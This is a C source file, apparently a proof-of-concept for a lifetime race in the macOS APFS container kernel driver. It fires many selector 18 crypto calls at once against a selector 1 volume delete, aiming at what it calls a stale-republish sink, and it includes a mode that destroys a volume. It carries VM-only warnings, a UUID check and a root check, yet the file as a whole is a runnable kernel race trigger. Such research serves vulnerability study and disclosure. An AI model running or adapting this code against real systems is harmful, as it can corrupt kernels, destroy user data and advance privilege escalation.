/*
 * APFS selector 18/selector 1 lifetime-race probe for macOS 27 26A5378n.
 *
 * VM ONLY. The program refuses to open an arbitrary AppleAPFSContainer: the
 * caller must provide the exact disposable container UUID printed by
 * `diskutil apfs list`. Start with --mode probe, which uses selector 18 op 4
 * and does not reach the stale-republish sink.
 */
#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOKitLib.h>
#include <mach/mach_error.h>
#include <mach/mach_time.h>
#include <pthread.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

struct crypto_in {
    uint32_t volume_index;
    uint32_t op;
};

struct worker {
    io_connect_t connection;
    uint32_t volume_index;
    uint32_t op;
    kern_return_t result;
};

static _Atomic int g_go;
static uint32_t g_delete_delay_us;

static void delay_microseconds(uint32_t microseconds)
{
    if (microseconds == 0)
        return;
    mach_timebase_info_data_t timebase;
    (void)mach_timebase_info(&timebase);
    uint64_t nanoseconds = (uint64_t)microseconds * 1000;
    uint64_t ticks = nanoseconds * timebase.denom / timebase.numer;
    (void)mach_wait_until(mach_absolute_time() + ticks);
}

static void print_kr(const char *label, kern_return_t kr)
{
    const char *message = mach_error_string(kr);
    fprintf(stderr, "%s: kr=0x%08x (%s)\n", label, kr,
            message != NULL ? message : "unknown");
}

static int copy_cf_string(CFTypeRef value, char *buffer, size_t size)
{
    if (value == NULL || CFGetTypeID(value) != CFStringGetTypeID())
        return 0;
    return CFStringGetCString((CFStringRef)value, buffer, (CFIndex)size,
                              kCFStringEncodingUTF8);
}

static io_service_t find_exact_container(const char *wanted_uuid)
{
    io_iterator_t iterator = IO_OBJECT_NULL;
    CFMutableDictionaryRef matching = IOServiceMatching("AppleAPFSContainer");
    kern_return_t kr;

    if (matching == NULL) {
        fprintf(stderr, "IOServiceMatching failed\n");
        return IO_OBJECT_NULL;
    }

    kr = IOServiceGetMatchingServices(kIOMainPortDefault, matching, &iterator);
    if (kr != KERN_SUCCESS) {
        print_kr("IOServiceGetMatchingServices", kr);
        return IO_OBJECT_NULL;
    }

    io_service_t selected = IO_OBJECT_NULL;
    io_service_t service;
    while ((service = IOIteratorNext(iterator)) != IO_OBJECT_NULL) {
        CFTypeRef value = IORegistryEntryCreateCFProperty(
            service, CFSTR("UUID"), kCFAllocatorDefault, 0);
        char uuid[128] = "<missing>";
        (void)copy_cf_string(value, uuid, sizeof(uuid));
        fprintf(stderr, "container candidate: UUID=%s registry=0x%x\n",
                uuid, service);

        if (strcasecmp(uuid, wanted_uuid) == 0) {
            if (selected != IO_OBJECT_NULL) {
                fprintf(stderr, "duplicate UUID match; refusing target\n");
                IOObjectRelease(selected);
                selected = IO_OBJECT_NULL;
                if (value != NULL)
                    CFRelease(value);
                IOObjectRelease(service);
                break;
            }
            selected = service;
        } else {
            IOObjectRelease(service);
        }
        if (value != NULL)
            CFRelease(value);
    }
    IOObjectRelease(iterator);

    if (selected == IO_OBJECT_NULL)
        fprintf(stderr, "no unique AppleAPFSContainer matched UUID %s\n",
                wanted_uuid);
    return selected;
}

static io_connect_t open_connection(io_service_t service)
{
    io_connect_t connection = IO_OBJECT_NULL;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &connection);
    if (kr != KERN_SUCCESS) {
        print_kr("IOServiceOpen", kr);
        return IO_OBJECT_NULL;
    }
    return connection;
}

static kern_return_t call_crypto(io_connect_t connection, uint32_t index,
                                 uint32_t op, uint8_t *output,
                                 size_t *output_size)
{
    const struct crypto_in input = {
        .volume_index = index,
        .op = op,
    };
    return IOConnectCallStructMethod(connection, 18, &input, sizeof(input),
                                     output, output_size);
}

static kern_return_t call_delete(io_connect_t connection, uint32_t index)
{
    /* Selector 1's dispatch contract is exactly four input bytes. */
    return IOConnectCallStructMethod(connection, 1, &index, sizeof(index),
                                     NULL, NULL);
}

static void *crypto_worker(void *opaque)
{
    struct worker *worker = opaque;
    while (atomic_load_explicit(&g_go, memory_order_acquire) == 0)
        sched_yield();
    worker->result = call_crypto(worker->connection, worker->volume_index,
                                 worker->op, NULL, NULL);
    return NULL;
}

static void *delete_worker(void *opaque)
{
    struct worker *worker = opaque;
    while (atomic_load_explicit(&g_go, memory_order_acquire) == 0)
        sched_yield();
    delay_microseconds(g_delete_delay_us);
    worker->result = call_delete(worker->connection, worker->volume_index);
    return NULL;
}

static void usage(const char *program)
{
    fprintf(stderr,
        "usage: %s --container-uuid UUID [--volume-index N] "
        "[--mode probe|op|delete|race] [--op 1|2|3] [--threads N] "
        "[--delete-delay-us N]\n"
        "  probe  selector 18 op 4 query; non-destructive default\n"
        "  op     one selector 18 modifying call\n"
        "  delete one selector 1 call; destroys the selected volume\n"
        "  race   N one-shot selector 18 calls against one selector 1 delete\n",
        program);
}

int main(int argc, char **argv)
{
    const char *container_uuid = NULL;
    const char *mode = "probe";
    uint32_t volume_index = 0;
    uint32_t op = 2;
    unsigned thread_count = 8;

    for (int i = 1; i < argc; ++i) {
        if (strcmp(argv[i], "--container-uuid") == 0 && i + 1 < argc) {
            container_uuid = argv[++i];
        } else if (strcmp(argv[i], "--volume-index") == 0 && i + 1 < argc) {
            volume_index = (uint32_t)strtoul(argv[++i], NULL, 0);
        } else if (strcmp(argv[i], "--mode") == 0 && i + 1 < argc) {
            mode = argv[++i];
        } else if (strcmp(argv[i], "--op") == 0 && i + 1 < argc) {
            op = (uint32_t)strtoul(argv[++i], NULL, 0);
        } else if (strcmp(argv[i], "--threads") == 0 && i + 1 < argc) {
            thread_count = (unsigned)strtoul(argv[++i], NULL, 0);
        } else if (strcmp(argv[i], "--delete-delay-us") == 0 && i + 1 < argc) {
            g_delete_delay_us = (uint32_t)strtoul(argv[++i], NULL, 0);
        } else {
            usage(argv[0]);
            return 2;
        }
    }

    if (container_uuid == NULL || volume_index > 99 || op < 1 || op > 3 ||
        thread_count == 0 || thread_count > 64 || g_delete_delay_us > 1000000) {
        usage(argv[0]);
        return 2;
    }
    if (strcmp(mode, "probe") != 0 && strcmp(mode, "op") != 0 &&
        strcmp(mode, "delete") != 0 && strcmp(mode, "race") != 0) {
        usage(argv[0]);
        return 2;
    }
    if (strcmp(mode, "probe") != 0 && geteuid() != 0) {
        fprintf(stderr, "%s mode requires root; refusing to call\n", mode);
        return 2;
    }

    io_service_t service = find_exact_container(container_uuid);
    if (service == IO_OBJECT_NULL)
        return 3;

    if (strcmp(mode, "probe") == 0) {
        io_connect_t connection = open_connection(service);
        uint8_t output[32] = {0};
        size_t output_size = sizeof(output);
        IOObjectRelease(service);
        if (connection == IO_OBJECT_NULL)
            return 3;
        kern_return_t kr = call_crypto(connection, volume_index, 4,
                                       output, &output_size);
        print_kr("selector18(op4 query)", kr);
        fprintf(stderr, "output_size=%zu output=", output_size);
        for (size_t i = 0; i < output_size && i < sizeof(output); ++i)
            fprintf(stderr, "%02x", output[i]);
        fputc('\n', stderr);
        IOServiceClose(connection);
        return kr == KERN_SUCCESS ? 0 : 1;
    }

    if (strcmp(mode, "op") == 0 || strcmp(mode, "delete") == 0) {
        io_connect_t connection = open_connection(service);
        IOObjectRelease(service);
        if (connection == IO_OBJECT_NULL)
            return 3;
        kern_return_t kr = strcmp(mode, "op") == 0
            ? call_crypto(connection, volume_index, op, NULL, NULL)
            : call_delete(connection, volume_index);
        print_kr(mode, kr);
        IOServiceClose(connection);
        return kr == KERN_SUCCESS ? 0 : 1;
    }

    struct worker *workers = calloc(thread_count + 1, sizeof(*workers));
    pthread_t *threads = calloc(thread_count + 1, sizeof(*threads));
    if (workers == NULL || threads == NULL) {
        fprintf(stderr, "allocation failed\n");
        IOObjectRelease(service);
        free(workers);
        free(threads);
        return 3;
    }

    for (unsigned i = 0; i <= thread_count; ++i) {
        workers[i].connection = open_connection(service);
        workers[i].volume_index = volume_index;
        workers[i].op = op;
        if (workers[i].connection == IO_OBJECT_NULL) {
            fprintf(stderr, "connection %u failed; refusing partial race\n", i);
            IOObjectRelease(service);
            return 3;
        }
    }
    IOObjectRelease(service);

    atomic_store_explicit(&g_go, 0, memory_order_relaxed);
    for (unsigned i = 0; i < thread_count; ++i)
        pthread_create(&threads[i], NULL, crypto_worker, &workers[i]);
    pthread_create(&threads[thread_count], NULL, delete_worker,
                   &workers[thread_count]);

    fprintf(stderr,
            "VM-only one-shot race: UUID=%s index=%u op=%u crypto_threads=%u "
            "delete_delay_us=%u\n",
            container_uuid, volume_index, op, thread_count, g_delete_delay_us);
    atomic_store_explicit(&g_go, 1, memory_order_release);

    for (unsigned i = 0; i <= thread_count; ++i)
        pthread_join(threads[i], NULL);
    for (unsigned i = 0; i < thread_count; ++i) {
        char label[64];
        snprintf(label, sizeof(label), "selector18 worker %u", i);
        print_kr(label, workers[i].result);
    }
    print_kr("selector1 delete", workers[thread_count].result);

    for (unsigned i = 0; i <= thread_count; ++i)
        IOServiceClose(workers[i].connection);
    free(workers);
    free(threads);
    return 0;
}
